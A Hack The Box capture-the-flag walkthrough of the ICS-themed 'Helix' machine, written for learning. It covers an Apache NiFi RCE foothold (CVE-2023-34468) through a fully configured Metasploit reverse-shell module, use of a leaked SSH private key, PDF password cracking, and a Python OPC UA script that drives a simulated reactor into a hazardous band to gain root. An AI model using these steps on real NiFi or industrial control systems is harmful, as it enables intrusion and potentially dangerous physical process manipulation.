# HTB Helix: Walkthrough

## Machine Info

| Field | Detail |
|-------|--------|
| Platform | Hack The Box |
| Machine | Helix |
| Difficulty | Medium |
| OS | Linux |
| IP | 10.129.XX.XX |
| Status | PENDING RETIREMENT CONFIRMATION (workshop copy, private repo only until retirement is verified) |
| CVEs exploited | CVE-2023-34468 (Apache NiFi H2 JDBC RCE) |

---

## Summary

Helix is an ICS-themed medium Linux box that chains three failures across very different classes: an unauthenticated Apache NiFi instance exposing CVE-2023-34468 for initial foothold, an SSH private key left behind in a NiFi diagnostic bundle for lateral movement, and an OPC UA logic abuse against a simulated reactor control system for root. The privilege escalation is the interesting part: no exploit code, only documented operator functions combined in an order the designer did not anticipate, coercing the safety controller into opening a "maintenance window" that unlocks a `NOPASSWD` sudo binary. The lesson generalises well beyond CTF: a diagnostic that has physical consequences is a control action, not a diagnostic.

---

## Step 1: Reconnaissance

**Objective:** identify open services and the externally reachable attack surface.

```bash
nmap -sC -sV -p22,80 -oN scans/nmap-tcp.txt 10.129.XX.XX
```

**Result:**
- `22/tcp` OpenSSH 8.9p1 (Ubuntu)
- `80/tcp` nginx 1.18.0 (Ubuntu)

**What this told me:**
- Only two external services. SSH is not exploitable without credentials, so the web server is the only realistic entry point.
- nginx as the fronting server suggests reverse-proxying to something behind it; worth virtual-host fuzzing rather than assuming the landing page is the whole application.

**Screenshot:** Figure 1

![](/HTB/Helix/images/03-Nmap_Scan.png)

---

## Step 2: Landing page and hostname discovery

**Objective:** enumerate the primary web application and add any advertised hostname to `/etc/hosts` so vhost routing works.

```bash
curl -I http://10.129.XX.XX/
echo "10.129.XX.XX helix.htb" | sudo tee -a /etc/hosts
```

**Result:** redirect to `http://helix.htb/`. The corporate "Helix Industries Operations Center" page loaded but was static: no forms, no login, no dynamic parameters, no interesting JavaScript.

**What this told me:**
- The primary vhost is a dead end for direct exploitation. When a box gives you nginx and a marketing page, the real application is almost always on a sibling vhost.
- Time to fuzz vhosts, not directories.

**Screenshot:** Figure 2

![](/HTB/Helix/images/05-FUFF_Scan.png)

---

## Step 3: Virtual host enumeration

**Objective:** find non-default vhosts served by the same nginx instance.

```bash
ffuf -u http://helix.htb \
     -H "Host: FUZZ.helix.htb" \
     -w /usr/share/wordlists/dirb/common.txt \
     -fs 154
```

**Result:** `flow.helix.htb` returned a 1068-byte response, cleanly separated from the noise by the `-fs 154` size filter.

**What this told me:**
- `flow` as a subdomain is a strong hint at a data-flow platform. NiFi, Airflow, Node-RED, or similar. Worth loading in a browser before assuming anything.
- The `-fs` size filter is the discipline that makes vhost fuzzing usable: without it, every 200 OK looks the same.

Added to `/etc/hosts` and moved on:

```bash
echo "10.129.XX.XX flow.helix.htb" | sudo tee -a /etc/hosts
```

**Screenshot:** Figure 3

---

## Step 4: Apache NiFi identification

**Objective:** fingerprint the flow.helix.htb application and confirm the version.

Loaded `http://flow.helix.htb/nifi/` in the browser. Apache NiFi canvas loaded without an authentication prompt. About dialog confirmed version 1.21.0.

**What this told me:**
- Unauthenticated NiFi is effectively RCE-as-a-feature. Its `ExecuteProcess`, `ExecuteStreamCommand`, and `ExecuteScript` processors run arbitrary commands as legitimate pipeline operations. You do not need a CVE to weaponise an unauth NiFi, you just build a processor.
- However, version 1.21.0 also maps to published CVEs, so I checked those before hand-rolling a processor.

**Screenshot:** Figure 4

![](/HTB/Helix/images/09-CVE_Library.png)

---

## Step 5: CVE selection and mechanism analysis

**Objective:** identify a reliable, documented exploitation path for NiFi 1.21.0.

Version 1.21.0 maps to three published CVEs. I selected CVE-2023-34468 (H2 JDBC arbitrary code execution via the `DBCPConnectionPool` controller service).

Mechanism:
1. H2's JDBC URL accepts an `INIT=<SQL>` parameter, executed when the connection opens.
2. H2 accepts `CREATE ALIAS ... AS $$ <Java> $$` to compile and load inline Java into the JVM.
3. Chained, the two allow arbitrary Java execution inside NiFi's JVM when the controller service is enabled.

**What this told me:**
- The vulnerability class is a "feature interaction" bug, not a memory-safety issue. Understanding the mechanism matters more than memorising the CVE number, because the same class of bug recurs across any product that lets user-supplied JDBC URLs reach the H2 driver.

---

## Step 6: Manual exploitation attempt (dead end worth documenting)

**Objective:** exploit the H2 vector by hand to prove I understand it before reaching for a module.

I configured a `DBCPConnectionPool` controller service inside the NiFi UI with a hand-crafted H2 JDBC URL carrying an `INIT` clause that used `CREATE ALIAS` to invoke `Runtime.getRuntime().exec()`.

**Result:** the mechanism was correctly understood but no callback landed in the lab. Likely a listener or payload-encoding issue I did not fully diagnose before pivoting.

**What this told me:**
- Documenting dead ends is not weakness, it is methodology. Anyone reading this can see the manual path exists and matches the CVE mechanism, and can also see the analyst chose the pragmatic route once time-boxed.
- Interview lesson: if asked "did you understand what Metasploit did?", the answer is yes because I built the equivalent by hand first.

---

## Step 7: Foothold via Metasploit

**Objective:** achieve reliable command execution as the NiFi service account.

```
use exploit/multi/http/apache_nifi_processor_rce
set RHOSTS 10.129.XX.XX
set RPORT 80
set VHOST flow.helix.htb
set SSL false
set LHOST 10.10.XX.XX
set LPORT 4444
set TARGETURI /nifi-api
set ForceExploit true
run
```

**Result:** command shell session as `nifi`.

```
$ whoami
nifi
```

**What this told me:**
- The module uses `ExecuteStreamCommand` processor creation via the NiFi REST API, a different vector to my manual H2 approach but exploiting the same underlying "unauth = RCE" fact.
- The pre-flight check returned 404 (nginx path handling), which is why `ForceExploit true` was needed. Bypassing the check is only acceptable when you have manually confirmed the target is genuinely vulnerable, which the version banner did.

**Screenshot:** Figure 5

![](/HTB/Helix/images/11-Initial_foot_hold.png)

---

## Step 8: Post-exploitation enumeration

**Objective:** find lateral movement or privilege escalation material in the NiFi install directory.

```bash
ls -la /opt/nifi-1.21.0/support-bundles/
```

**Result:**

```
-rw-r----- 1 nifi nifi 411 Jan 25 2026 operator_id_ed25519.bak
```

An OpenSSH ed25519 private key backup, named after the `operator` user, sitting inside a diagnostic bundle directory.

**What this told me:**
- Classic "secrets in unexpected locations" pattern. Diagnostic dumps, support bundles, and log directories are recurring hiding places for credential material because engineers forget the sensitivity of what gets swept into them.
- The key comment (`root@management`) suggested it was originally generated by root on a management host, then repurposed for the operator account. That is bad key hygiene in the real world too.

**Screenshot:** Figure 6

![](/HTB/Helix/images/12-SSH_Key.png)

---

## Step 9: Lateral movement to operator (user flag)

**Objective:** authenticate as `operator` using the recovered key.

```bash
chmod 600 operator_id_ed25519
ssh -i operator_id_ed25519 operator@helix.htb
```

**Result:** interactive shell as `operator`. User flag retrieved from `/home/operator/user.txt`.

**What this told me:**
- No password prompt, no MFA, no jump host. Key-based auth is only as strong as the file system controls around the key.

**Screenshot:** Figure 7

![](/HTB/Helix/images/13-User_foot_hold.png)

---

## Step 10: Privilege escalation enumeration

**Objective:** identify the privesc surface as `operator`.

```bash
sudo -l
```

**Result:**

```
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

Running the binary:

```
$ sudo /usr/local/sbin/helix-maint-console
Maintenance window CLOSED.
```

Listening services:

```bash
ss -tlnp
```

- `127.0.0.1:8081` HMI web interface
- `127.0.0.1:8080` internal service
- `127.0.0.1:4840` OPC UA server (IANA-registered port for OPC UA)

Documentation artefacts in `~operator`:

- `control systems diagram.png`
- `Operator Control & Safety Guide.pdf` (password-protected)

**What this told me:**
- `helix-maint-console` is gated on state, not authentication. The privesc question becomes: what opens the maintenance window?
- Port 4840 is the control plane. OPC UA is the primary industrial protocol used in modern SCADA and PLC stacks. This is an ICS box, not a Linux privesc box, and the answer will not come from `pspy` or SUID hunting.
- The password-protected PDF is not incidental; it is the operator manual for the system I need to abuse.

**Screenshot:** Figure 8

![](/HTB/Helix/images/16-Target_open_ports.png)

---

## Step 11: PDF password recovery

**Objective:** unlock the operator control and safety guide.

```bash
pdf2john "Operator Control & Safety Guide.pdf" > pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=PDF pdf.hash
```

**Result:** password recovered as `<REDACTED>`.

**What this told me:**
- Username plus a single trailing digit is a weak-password pattern that appears in real breach corpora repeatedly. `rockyou.txt` catches it in seconds.

**Screenshot:** Figure 9

![](/HTB/Helix/images/23-John2PDF_Crack.png)

---

## Step 12: System documentation review

**Objective:** understand the reactor's control logic and identify which OPC UA variables map to which physical or logical states.

The guide documented, in the analyst's consolidated form:

| Band | Temperature | Pressure | State |
|------|-------------|----------|-------|
| Safe, reset-eligible | < 288 C | < 70 bar | ResetTrip accepted |
| Normal idle | ~284 C | ~69 bar | Baseline |
| Maintenance window | >= 295 C | >= 73 bar | helix-maint-console unlocks |
| Trip | >= 305 C | >= 75 bar | Locked out |

Trip reset preconditions (all must hold): Temperature < 288 C, Pressure < 70 bar, Mode = NORMAL, TestOverride disabled, CalibrationOffset = 0.0.

Section 8 of the guide, describing `CalibrationOffset`: "when CalibrationOffset is increased gradually, Temperature rises predictably, Pressure increases slowly and remains tightly constrained."

**What this told me:**
- The guide introduces `CalibrationOffset` as a sensor calibration bias with no direct control of reactor state. Section 8 then contradicts that description: gradually increasing it drives actual temperature and pressure. That contradiction is the vulnerability.
- The "maintenance window" is not a mode you toggle. It is a state the safety controller autonomously grants when temperature or pressure sit in the hazardous-but-not-tripped band. This is the target state.

---

## Step 13: OPC UA enumeration

**Objective:** connect to the OPC UA endpoint and identify writable versus read-only nodes.

Minimal Python client using `asyncua`:

```python
import asyncio
from asyncua import Client

async def main():
    async with Client("opc.tcp://127.0.0.1:4840/helix/") as c:
        print("[+] Connected")
        root = c.nodes.root
        # walk address space, print BrowseName + UserAccessLevel bits

asyncio.run(main())
```

**Result:**

Writable nodes (UserAccessLevel bit 0x02 set):

- `Plant.Control.Mode` (`ns=2;i=12`)
- `Plant.Control.TestOverride` (`ns=2;i=13`)
- `Plant.Control.ResetTrip` (`ns=2;i=14`)
- `Plant.Reactor.CalibrationOffset` (`ns=2;i=6`)
- `Plant.Safety.RodsInserted` (`ns=2;i=8`) reported writable, server-side logic ignores writes
- `Plant.Safety.EmergencyCooling` (`ns=2;i=9`) same

Read-only nodes:

- `Plant.Reactor.Temperature` (`ns=2;i=4`)
- `Plant.Reactor.Pressure` (`ns=2;i=5`)
- `Plant.Safety.TripActive` (`ns=2;i=10`)

**What this told me:**
- Rods and emergency cooling advertise writability but are ignored server-side. That is the safety controller doing its job on those specific inputs. The interesting attack path is through the inputs the safety controller trusts, which are Mode, TestOverride, and CalibrationOffset.
- Temperature and pressure are read-only. I cannot spoof them directly. But I can drive them indirectly via CalibrationOffset, which is the whole point of the finding.

**Screenshot:** Figure 10

![](/HTB/Helix/images/24-Helix_PDF_Page1.png)

![](/HTB/Helix/images/25-Helix_PDF_Page2.png)

![](/HTB/Helix/images/26-Helix_PDF_Page3.png)

---

## Step 14: Exploit design

**Objective:** construct the minimal sequence that lands temperature in the maintenance-window band (295 C to 304.9 C) without tripping (>= 305 C).

The critical insight, and the point that makes this finding worth writing up: "MAINTENANCE mode" (a value of the `Control.Mode` variable) and the "maintenance window" (a state granted by the safety controller) are separate concepts sharing similar names. Setting Mode to MAINTENANCE alone does nothing useful. The window only opens when the safety controller sees hazardous physical readings.

Chain:

1. `Control.Mode = "MAINTENANCE"` (enables the mechanism)
2. `Control.TestOverride = True` (further enables the mechanism)
3. Ramp `CalibrationOffset` upward slowly, one unit per second
4. Land in 295 C to 304.9 C temperature band
5. Safety controller opens the maintenance window
6. In a second SSH session, execute `sudo /usr/local/sbin/helix-maint-console` while the window is open

**What this told me:**
- This is a race. The window is time-limited. Two SSH sessions were needed: one to hold the reactor in the target band, one to fire the sudo command.
- Overshooting to >= 305 C locks the system out. The exploit must include a safety rollback that reduces the offset if the trip fires or if the temperature approaches the trip threshold.

---

## Step 15: Exploitation

**Objective:** execute the chain and capture root.

Exploit script written to `/tmp/opcua_exploit.py` on the target using heredoc (avoids paste corruption of multi-line Python over the SSH channel):

```python
import asyncio
from asyncua import Client

URL = "opc.tcp://127.0.0.1:4840/helix/"
WINDOW_TEMP = 295.0
TRIP_TEMP   = 305.0

async def main():
    async with Client(URL) as c:
        mode  = c.get_node("ns=2;i=12")
        ov    = c.get_node("ns=2;i=13")
        cal   = c.get_node("ns=2;i=6")
        temp  = c.get_node("ns=2;i=4")
        trip  = c.get_node("ns=2;i=10")

        await mode.write_value("MAINTENANCE")
        await ov.write_value(True)
        await cal.write_value(0.0)

        for step in range(1, 51):
            await cal.write_value(float(step))
            await asyncio.sleep(1)
            t = float(await temp.read_value())
            tr = bool(await trip.read_value())
            print(f"  offset={step:.1f}  temp={t:.2f}C  trip={tr}")

            if tr or t >= TRIP_TEMP:
                await cal.write_value(float(step) - 3.0)
                return

            if t >= WINDOW_TEMP:
                print("\n[+] WINDOW OPEN, fire sudo helix-maint-console now\n")
                await asyncio.sleep(90)
                return

asyncio.run(main())
```

Execution across two SSH sessions:

- Terminal A: `python3 /tmp/opcua_exploit.py`, ramps and holds
- Terminal B: `sudo /usr/local/sbin/helix-maint-console`, fired the moment Terminal A announces the window is open

**Result:** at offset ~16, temperature crossed 295 C without tripping. The maintenance console executed, returned `[+] Privileged maintenance access granted`, and dropped a root shell. Root flag retrieved from `/root/root.txt`.

**What this told me:**
- The exploit is not a memory corruption or a payload. It is a state manipulation. That is the pattern for a large fraction of real ICS incidents: the attacker never violates the protocol, they use it as designed to reach a state the designer did not anticipate.

**Screenshot:** Figure 11

![](/HTB/Helix/images/28-Opcua_exploit_py.png)

---

## Step 16: Root

**Objective:** confirm and document full control.

```bash
whoami
id
cat /root/root.txt
```

**Result:** `whoami` returned `root`. Flag retrieved.

**What this told me:**
- The escalation worked because the safety controller and the sudo gate both trusted reported sensor state rather than independently verified physical state. Anywhere a security decision trusts a value that another party can manipulate, the same pattern exists.

**Screenshot:** Figure 12

![](/HTB/Helix/images/29-Root_Access.png)

---

## Flags

| Flag | Method | Status |
|------|--------|--------|
| User | SSH as `operator` using key recovered from NiFi `support-bundles/` directory | REDACTED |
| Root | `sudo helix-maint-console` while OPC UA CalibrationOffset abuse held the reactor in the maintenance-window temperature band | REDACTED |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | TCP service scan and version detection |
| ffuf | Virtual host fuzzing with size-based filtering |
| Metasploit (`apache_nifi_processor_rce`) | Reliable RCE against NiFi 1.21.0 |
| ssh, scp | Lateral movement and post-exploitation transport |
| pdf2john, John the Ripper | PDF password recovery |
| Python 3 with `asyncua` | OPC UA enumeration and exploitation |
| ss | Local listener enumeration |

---

## Lessons Learned

1. Build the manual exploit before reaching for the module, even if the module is what ultimately works. The manual attempt cost time but it is the reason I can answer "did you understand what Metasploit did?" honestly in interview. Time-box it; do not let it become a rabbit hole.
2. Read the documentation, especially when the box provides it. The whole ICS finding was sitting in Section 8 of the operator guide. The vulnerability was the contradiction between how `CalibrationOffset` was described (sensor bias only) and how it actually behaved (reactor state input). Documentation is intelligence.
3. When a privilege gate is time-limited, plan the second shell before you start the timer. Racing to set up a second SSH session while the maintenance window is counting down is how you lose the window and have to reset the reactor.

---

## References

| Resource | URL |
|----------|-----|
| CVE-2023-34468 (Apache NiFi H2 JDBC RCE) | https://nvd.nist.gov/vuln/detail/CVE-2023-34468 |
| Apache NiFi 1.23.0 release notes (fix) | https://nifi.apache.org/docs.html |
| OPC UA specification overview | https://opcfoundation.org/about/opc-technologies/opc-ua/ |
| MITRE ATT&CK for ICS: T0836 Modify Parameter | https://attack.mitre.org/techniques/T0836/ |
| MITRE ATT&CK for ICS: T0831 Manipulation of Control | https://attack.mitre.org/techniques/T0831/ |
| MITRE ATT&CK T1552.004 Unsecured Credentials: Private Keys | https://attack.mitre.org/techniques/T1552/004/ |

---

*This walkthrough documents a Hack The Box machine completed in an authorised lab environment for educational purposes. Flags are redacted. HTB target IP obfuscated as 10.129.XX.XX; attacker VPN IP obfuscated as 10.10.XX.XX. No unauthorised systems were accessed. Publication is gated on retirement confirmation; this copy remains in the private repo until Helix is verified as retired.*
